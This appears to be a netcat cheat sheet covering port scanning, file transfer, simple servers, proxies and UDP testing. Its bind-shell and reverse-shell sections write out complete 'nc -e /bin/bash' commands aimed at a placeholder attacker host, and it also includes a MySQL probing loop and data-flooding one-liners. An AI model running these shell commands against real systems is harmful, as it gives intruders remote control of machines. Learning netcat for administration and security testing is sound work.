

`netcat` (or `nc`) is a super versatile command-line tool often called the "Swiss Army knife of networking." 
You can use it to:
- Test ports
- Send/receive files
- Set up simple servers
- Chat between systems
- Debug connections

The `nc` command on Linux stands for **Netcat**. 

It's a powerful networking utility used for reading from and writing to network connections using TCP or UDP. 

```sh
nc [options] [hostname] [port]
```

---

# Port Scanning

```bash
nc -zv 192.168.1.1 20-80
```
This scans ports 20 to 80 on `192.168.1.1`.
`-z`: Zero-I/O mode (used for scanning).
`-v`: Verbose output.

**Use loop**
```sh
for i in 56 85 41 15 121; do echo "HELLO" | nc -w 10 192.168.1.$i 3306; echo -e -n "$i\b\b"; done
```
`echo "HELLO" `→ sends the string HELLO.
`nc`  connects to host `192.168.1.$i` on port `3306` (default MySQL port).
`-w 10` → sets a timeout of 10 seconds.
So this tries to connect to:
+ `192.168.1.56:3306`
+ `192.168.1.85:3306`
+ `192.168.1.41:3306`
+ `192.168.1.15:3306`
+ `192.168.1.121:3306`
and sends the word HELLO.
👉 Effectively, it’s probing those IPs to see if MySQL is listening.


# Verbose mode
Makes `nc` print extra information about the connection attempt.
```sh
nc -v 192.168.1.10 80
```

# Timeout
`-w <seconds>` = timeout for connects and final net reads
Tells `nc` how long to wait before giving up.
```sh
nc -w 5 192.168.1.10 3306
```

# Create a Simple Chat (TCP):
On one machine (listener):
```bash
nc -l -p 1234
```
On another (client):
```
nc <listener-ip> 1234
```

# Transfer Files:
On the receiving machine:
```bash
nc -l -p 1234 > received_file.txt
```
On the sending machine:
```bash
nc <receiver-ip> 1234 < file_to_send.txt
```

# Web Server Testing (send HTTP requests manually):
```bash
nc example.com 80
```
Then type:
```http
GET / HTTP/1.1
Host: example.com
```

# Bind Shell / Reverse Shell:
**Bind shell** (victim listens):
```bash
nc -l -p 4444 -e /bin/bash
```
**Reverse shell** (victim connects):
```bash
nc <attacker-ip> 4444 -e /bin/bash
```

# Simple TCP Server
```bash
while true; do nc -l -p 8080 -c 'echo Hello, world'; done
```
Opens a simple HTTP-like server that replies with "Hello, world".
`-c` runs the command and sends its output.
- Note: `-c` might not be supported in all versions (try `-e` or use `bash -c` workaround).

# Create a TCP Proxy
```bash
mkfifo pipe
nc -l -p 8888 < pipe | nc target.com 80 > pipe
```
Forwards connections from port `8888` to `target.com:80`.
Useful for debugging or man-in-the-middle testing.

# Send Data to a Port
```bash
echo "Hello from client" | nc localhost 5000
```
Sends a plain text message to a listening server on port 5000.

# Basic HTTP Request
```bash
printf "HEAD / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
```
Sends a minimal HTTP HEAD request to `example.com`.

# UDP Server and Client
UDP Server:
```bash
nc -u -l -p 12345
```
UDP Client:
```bash
echo "Hello UDP" | nc -u server-ip 12345
```

# Remote Shell Access (with -e)
Listener (attacker):
```bash
nc -l -p 4444
```
Victim (reverse shell):
```bash
nc attacker-ip 4444 -e /bin/bash
```
Note: `-e` is often **disabled** in modern versions for security. Use alternatives like `socat` or SSH for legitimate remote access.

# Send Many Lines of Data via TCP
```bash
yes "hello" | nc target-ip 1234
```
- Sends the word **"hello"** continuously to `target-ip` on TCP port 1234.
- `yes` is a Unix command that outputs lines rapidly.
- Good for testing how a server handles incoming data streams.

# Send Data via UDP Instead (if needed)
```bash
yes "hello" | nc -u target-ip 1234
```
- Uses UDP (`-u`) instead of TCP.
- There's **no handshake or acknowledgment**, so it’s faster but not reliable.
- UDP is more suitable for raw packet testing.

# Want Real Packet Flooding or Stress Testing?
For that, use tools like:
- `hping3` — for crafting and sending custom TCP/UDP/ICMP packets.
- `nping` (comes with Nmap)
- `iperf` — for bandwidth testing.
- `LOIC` / `HOIC` — **not recommended** outside of lab environments (illegal in most contexts).


